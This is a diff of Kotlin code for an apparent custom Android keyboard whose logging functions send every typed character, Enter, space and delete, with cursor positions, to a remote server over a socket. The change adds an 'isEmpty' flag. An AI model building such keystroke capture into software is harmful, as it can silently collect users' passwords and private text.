@@ -56,14 +56,17 @@ class KeyboardEnglish constructor(var context:Context, var layoutInflater: Layou
 
     fun logCommit(text:String){
         val jsonmessage = JSONObject()
+        jsonmessage.put("isEmpty", getTextEmpty());
         jsonmessage.put("type", "commit");
         jsonmessage.put("char", text);
         jsonmessage.put("cursor", getCursorPosition()+1);
         SocketClient(SERVER_IP, SERVER_PORT, jsonmessage).execute();
+        setTextEmpty(false)
     }
 
     fun logEnter(cursorPosition: Int){
         var josonmessage = JSONObject()
+        josonmessage.put("isEmpty", getTextEmpty())
         josonmessage.put("type", "commit")
         josonmessage.put("char", "\n")
         josonmessage.put("cursor", cursorPosition)
@@ -72,6 +75,7 @@ class KeyboardEnglish constructor(var context:Context, var layoutInflater: Layou
 
     fun logSpace(cursorPosition: Int){
         var josonmessage = JSONObject()
+        josonmessage.put("isEmpty", getTextEmpty())
         josonmessage.put("type", "commit")
         josonmessage.put("char", " ")
         josonmessage.put("cursor", cursorPosition)
@@ -80,9 +84,11 @@ class KeyboardEnglish constructor(var context:Context, var layoutInflater: Layou
 
     fun logDelete(cursorPosition: Int){
         var jsonmessage = JSONObject()
+        jsonmessage.put("isEmpty", getTextEmpty());
         jsonmessage.put("type", "delete");
         jsonmessage.put("cursor", getCursorPosition());
         SocketClient(SERVER_IP, SERVER_PORT, jsonmessage).execute();
+        setTextEmpty(false)
     }
 
 
